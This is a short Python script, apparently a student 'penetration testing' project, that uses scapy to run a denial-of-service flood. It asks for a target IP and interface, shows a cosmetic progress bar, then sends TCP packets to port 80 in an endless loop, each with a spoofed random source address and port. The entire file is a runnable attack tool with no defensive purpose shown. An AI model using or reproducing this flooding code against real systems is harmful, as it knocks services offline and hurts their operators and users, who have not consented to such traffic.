import random
from scapy.all import *
import sys
import os
import time

#setting up initial display screen
os.system("clear")
os.system("figlet DDos Attack")
print("\n")
print("Handle: Sl33k C1a4d3 The Hack3r")
print("Project: Python for P3n3trat10n T3st1n9")
print("Tag: [EPITA2020]")
print("\n")

# set target IP address and network interface used.
target_IP = input("Enter target IP: ")
interface = input("Enter Network Interface Used: ")

#initiating the attack.
os.system("clear")
os.system("figlet Attack Starting")
print("\n")
print ("[                    ] 0% ")
time.sleep(2)
print ("[=====               ] 25%")
time.sleep(1)
print ("[==========          ] 50%")
time.sleep(1)
print ("[===============     ] 75%")
time.sleep(1)
print ("[====================] 100%")
time.sleep(1)

"""
The flood function creates random ip address which are 
used for the flooding process. It also creates random 
port numbers from which the packets originate.
"""
def flood(target_IP):
	IP_packet = IP(src = RandIP(), dst = target_IP)
	TCP_packet = TCP(sport = RandNum(1, 65535), dport = 80)
	pkt = IP_packet/TCP_packet
	send(pkt, inter = 0.00000000000000000000000000000001, iface = interface)

	

# Create an infinite loop to continuously send flood packets
i = 1
while True:
	try:
		flood(target_IP)
		print("Packet Sent ", i)
		i = i + 1
	except KeyboardInterrupt:
		print("\n Quitting DDoS Attack...")
		time.sleep(3)
		exit() # press the ctrl+c button like times to effectively quit.
		
